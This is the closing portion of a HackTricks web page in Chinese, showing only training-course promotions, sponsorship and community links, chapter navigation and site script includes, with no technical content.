学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
